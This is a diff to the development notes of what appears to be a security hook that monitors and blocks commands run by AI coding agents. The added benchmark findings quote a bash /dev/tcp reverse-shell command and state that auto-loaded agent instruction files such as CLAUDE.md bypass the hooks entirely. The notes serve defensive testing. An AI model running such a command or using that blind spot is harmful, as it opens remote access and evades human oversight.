@@ -97,6 +97,11 @@ Found by summarizing the live audit log (715 records, 7 sessions):
 
 Lesson: the audit log is the best test input. Real sessions produced 4 bugs in 1 review that ~200 written cases missed.
 
+### F12. Week 5 benchmark — gaps found
+- Writing case 08 showed that `bash -i >& /dev/tcp/HOST/PORT` (reverse shell) was treated as a file write. `/dev/tcp` and `/dev/udp` redirects are now EGRESS (`dev_tcp`), and `>& file` is a write.
+- Case 08 itself stays **missed**: hooks never see auto-loaded `CLAUDE.md` / `AGENTS.md`. See docs/BENCHMARK.md.
+- Replay: balanced blocks 8/12 and asks on 3/12; strict blocks 11/12. Live-agent runs are blocked on the expired CLI login.
+
 ## Measurements
 
 ### M1. Hook latency, log-only (Windows 11, go1.27.4, 2026-11-16)
